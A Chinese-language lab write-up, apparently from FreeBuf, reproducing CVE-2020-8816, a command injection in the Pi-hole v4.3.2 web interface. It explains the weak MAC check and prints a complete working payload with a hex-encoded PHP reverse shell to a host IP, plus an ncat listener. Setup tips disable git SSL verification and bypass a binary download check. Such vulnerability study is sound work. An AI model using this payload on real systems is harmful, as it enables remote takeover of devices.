@@ -1,0 +1,300 @@
+**CVE-2020-8816是Pi-hole软件中的一个远程代码执行漏洞，Pi-hole是一个用于内容过滤的DNS服务器，也提供DHCP服务。这个软件提供一个Web界面，漏洞就存在于实现Web界面的源码中，影响版本在v4.3.2及其之前。**
+
+## 环境搭建(先看下面的“踩到的坑”)
+
+环境：virtualbox6.1 + ubuntu18.04 + pi-hole v4.3.2
+
+相关IP：
+
+> 虚拟机NAT网卡，IP地址为：10.0.2.15
+>
+> 虚拟机桥接网卡，IP地址为：192.168.0.107
+>
+> 主机IP地址为：192.168.0.105
+
+### 1、下载Pi-hole的安装脚本
+
+    
+    
+    mkdir pi-hole
+    cd pi-hole
+    wget -O basic-install.sh https://install.pi-hole.net
+    
+
+### 2、修改脚本文件，下载v4.3.2版本
+
+我一开始直接下载的v4.3.2的源码，但是安装过后还是发现最新版本，最后决定直接修改官方提供的安装脚本。
+
+注意要使用最新版本的安装脚本，v4.3.2中的安装脚本虽然也可以使用，但是修改的内容更多，这里不再赘述。
+
+找到make_repo()函数中的下述代码：
+
+    
+    
+    # Clone the repo and return the return code from this command
+    git clone -q --depth 20 "${remoteRepo}" "${directory}" &> /dev/null || return $?
+    
+
+修改为：
+
+    
+    
+    # Clone the repo and return the return code from this command
+    git clone -q --depth 20 --branch v4.3.2 "${remoteRepo}" "${directory}" &> /dev/null || return $?
+    
+
+系统在第一次安装时会调用make_repo()函数，从github上下载pihole以及web interface的代码，这里指定下载v4.3.2版本。
+
+如果不是第一次安装，系统会调用update_repo()函数，但是一般安装一次就能成功，如果需要再次安装，可以删除在make_repo()中创建的文件夹，避免进入update_repo()函数。
+
+### 3、执行脚本&安装成功
+
+    
+    
+    sudo bash basic-install.sh
+    
+
+因为我这里只是想要复现漏洞，不需要考虑软件的功能问题，所以基本选择默认选项就可以。
+
+注意这一步只选择一项，避免浪费时间，因为后面会连接这些站点下载屏蔽广告列表。
+
+![](https://image.3001.net/images/20200421/1587469014_5e9edad65867f.png!small)
+
+安装成功，显示以下界面：
+
+![](https://image.3001.net/images/20200421/1587469008_5e9edad03f5a5.png!small)
+
+打开<http://192.168.1.107/admin>，可以看到页面下方的版本号，正是我们需要的版本：
+
+![](https://image.3001.net/images/20200421/1587469001_5e9edac9e3796.png!small)
+
+## 踩到的坑
+
+### 1、ubuntu版本问题
+
+这个问题我估计大多数人应该遇不到，因为我的virtualbox里面当时刚好新装了一个ubuntu12.04，是一个干净的系统，我就直接用了这个版本的ubuntu，结果安装的时候发现找不到Pi-hole的一些依赖包，最终放弃，转战ubuntu18.04。
+
+### 2、SSL连接问题
+
+错误信息：
+
+    
+    
+    OpenSSL SSL_connect: SSL_ERROR_SYSCALL……
+    
+
+省略号部分我没有记住，但是如果遇到同样的错误应该能认出来。
+
+解决办法：
+
+执行以下命令
+
+    
+    
+    git config --global http.sslVerify false
+    
+
+### 3、FTL下载失败
+
+错误信息：
+
+    
+    
+    [i] Downloading and Installing FTL...
+    curl: (56) OpenSSL SSL_read: SSL_ERROR_SYSCALL, errno 104
+    [✗] Downloading and Installing FTL
+    Error: URL https://github.com/pi-hole/FTL/releases/download/v4.3.1/pihole-FTL-linux-x86_64 not found
+    [✗] FTL Engine not installed
+    
+
+解决办法：
+
+这个问题是由于网络原因导致的，如果你能[设置虚拟机使用主机代理](https://www.cnblogs.com/sakam0to/p/10627524.html)，下面的内容可以略过，但是由于个人原因，我的设置没有成功，所以需要在主机把文件下载下来，然后复制到正确的位置，并对脚本进行适当修改。
+
+注意，在错误信息中，我们已经获得了文件的下载地址<https://github.com/pi-hole/FTL/releases/download/v4.3.1/pihole-FTL-linux-x86_64>，下载完成后放入用户根目录。
+
+观察basic_install.sh文件，发现FTLinstall()函数中有这样一行代码：
+
+    
+    
+    # Move into the temp ftl directory
+        pushd "$(mktemp -d)" > /dev/null || { printf "Unable to make temporary directory for FTL binary download\\n"; return 1; }
+    
+
+所以说，程序会新建并进入一个临时文件夹，下载的文件也会保存在这里，而不是放在脚本所在文件夹。不管怎么样，我们只需要把下载下来的文件放入当前文件夹即可。修改basic_install.sh文件，在FTLinstall()函数中，找到下面的代码：  
+
+    
+    
+    # If the download worked,
+    if curl -sSL --fail "${url}/${binary}" -o "${binary}"; then
+        # get sha1 of the binary we just downloaded for verification.
+        curl -sSL --fail "${url}/${binary}.sha1" -o "${binary}.sha1"
+    
+
+并修改为：
+
+    
+    
+    # If the download worked,
+    # if curl -sSL --fail "${url}/${binary}" -o "${binary}"; then
+    cp ~/pihole-FTL-linux-x86_64 ./
+    if true; then
+        # get sha1 of the binary we just downloaded for verification.
+        curl -sSL --fail "${url}/${binary}.sha1" -o "${binary}.sha1"
+    
+
+## 漏洞分析
+
+### 出现问题的代码
+
+    
+    
+    function validMAC($mac_addr)
+    {
+      // Accepted input format: 00:01:02:1A:5F:FF (characters may be lower case)
+      return (preg_match('/([a-fA-F0-9]{2}[:]?){6}/', $mac_addr) == 1);    
+    }
+    
+    $mac = $_POST["AddMAC"];
+    
+    if(!validMAC($mac)) {...}
+    
+    $mac = strtoupper($mac);
+    
+    if(isset($_POST["addstatic"])) {
+        ...
+        exec("sudo pihole -a addstaticdhcp ".$mac." ".$ip." ".$hostname);
+        ...
+    }
+    
+    if(isset($_POST["removestatic"])) {
+        ...
+        exec("sudo pihole -a removestaticdhcp ".$mac);
+        ...
+    }
+    
+
+> 完整代码看[这里](https://github.com/pi-hole/AdminLTE/blob/master/scripts/pi-> hole/php/savesettings.php)。
+
+注意到，在validMAC函数中，只使用preg_match对MAC地址的格式进行了检查，而preg_match函数的作用是根据正则表达式的模式对字符串进行搜索匹配，并返回匹配字数。因此，只要用户的输入中存在MAC地址，就可以通过检查。
+
+通过检查的用户输入做了一次大写转换，然后直接放入了exec函数中。
+
+### 最终的payload
+
+    
+    
+    aaaaaaaaaaaa&&SHORT=${PATH##/***:/}&&A=${SHORT#???}&&P=${A%/???}&&B=${PWD#/???/???/}&&H=${B%???/?????}&&C=${PWD#/??}&&R=${C%/???/????/?????}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27"));'&&
+    
+
+### Payload分析
+
+1、模拟MAC地址
+
+    
+    
+    aaaaaaaaaaaa
+    
+
+根据源码中的validMAC()函数，我们得知程序会对用户输入做一个基本的MAC地址格式判断，只要由12个字母或数字组成，就可以通过验证。
+
+2、获取p,h,r的小写字符
+
+    
+    
+    SHORT=${PATH##/***:/}&&A=${SHORT#???}&&P=${A%/???}&&B=${PWD#/???/???/}&&H=${B%???/?????}&&C=${PWD#/??}&&R=${C%/???/????/?????}
+    
+
+原本的payload应该为：
+
+    
+    
+    aaaaaaaaaaaa&&php -r ‘$sock=fsockopen(“192.168.0.105”,2256);exec(“/bin/sh -i <&3 >&3 2>&3”);’
+    
+
+但是由于程序会对用户输入做一个大写转换，因此，php -r会变成PHP -R，命令无法识别，因此需要找到一种方式获取p、h、r的小写字符。
+
+可以使用环境变量，变量名都是大写字母，而变量值中可能包含各种小写字母。
+
+在浏览器中进入<http://192.168.1.107/admin>，登陆后，选择Setting->DHCP选项卡，先试一下PATH变量，输入aaaaaaaaaaaa$PATH，结果显示：
+
+![](https://image.3001.net/images/20200421/1587468983_5e9edab75838e.png!small)
+
+很遗憾，没有h字符，看来还需要找其他环境变量。我在env命令的执行结果中找到了PWD变量，输入试一下：
+
+![](https://image.3001.net/images/20200421/1587468975_5e9edaaf9d88e.png!small)
+
+里面有h和r，所以，我可以使用PATH和PWD两个环境变量，获得p、h、r这几个字符。
+
+我使用了[Shell参数扩展](https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html)对这两个变量值进行截取：
+
+    
+    
+    p:
+        SHORT=${PATH##/***:/}&&A=${SHORT#???}&&P=${A%/???}
+    h:
+        B=${PWD#/???/???/}&&H=${B%???/?????}
+    r:
+        C=${PWD#/??}&&R=${C%/???/????/?????}
+    
+
+根据[模式匹配](https://www.gnu.org/software/bash/manual/html_node/Pattern-Matching.html#Pattern-Matching)的规则，应该可以写出更简洁的方法，但是我的系统中好多shell选项都没有开启，考虑到通用性，我就直接选择了最傻瓜的匹配方式。
+
+3、获得反向shell
+
+    
+    
+    $P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27"));'
+    
+
+先把变量换成对应的字符，注意上面的`$IFS`是shell的一个内定变量，默认为`<space><tab><newline>`，这里代替空格。
+
+    
+    
+    php -r 'exec(hex2bin("706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27"))'
+    
+
+然后替换`hex2bin`的执行结果（转义符是我后加的）：
+
+    
+    
+    php -r 'exec(php -r \'$sock=fsockopen("192.168.1.105",2256);exec("/bin/sh -i <&3 >&3 2>&3");\')'
+    
+
+这段代码就可以获得一个反向shell。
+
+## 漏洞复现
+
+在主机的命令行中输入：
+
+    
+    
+    ncat -nlvp 2256
+    
+
+进入监听模式，等待其他机器的连接。
+
+返回虚拟机，在浏览器中打开`<http://192.168.1.107/admin>`，登录，选择Setting->DHCP选项卡，输入payload：
+
+    
+    
+    aaaaaaaaaaaa&&SHORT=${PATH##/***:/}&&A=${SHORT#???}&&P=${A%/???}&&B=${PWD#/???/???/}&&H=${B%???/?????}&&C=${PWD#/??}&&R=${C%/???/????/?????}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("706870202d72202724736f636b3d66736f636b6f70656e28223139322e3136382e312e313035222c32323536293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27"));'&&
+    
+
+返回主机，可以看到主机收到了连接，可以执行命令了：
+
+![](https://image.3001.net/images/20200421/1587468949_5e9eda95c0371.png!small)
+
+## 参考文献
+
+> [CVE-2020-8816 – Pi-hole Remote Code
+> Execution](https://natedotred.wordpress.com/2020/03/28/cve-2020-8816-pi-> hole-remote-code-execution/)
+>
+> [Shell Parameter
+> Expansion](https://www.gnu.org/software/bash/manual/html_node/Shell-> Parameter-Expansion.html)
+>
+> [Pattern
+> Matching](https://www.gnu.org/software/bash/manual/html_node/Pattern-> Matching.html#Pattern-Matching)
+
+ ***本文作者：s1len0eye，转载请注明来自FreeBuf.COM**
+
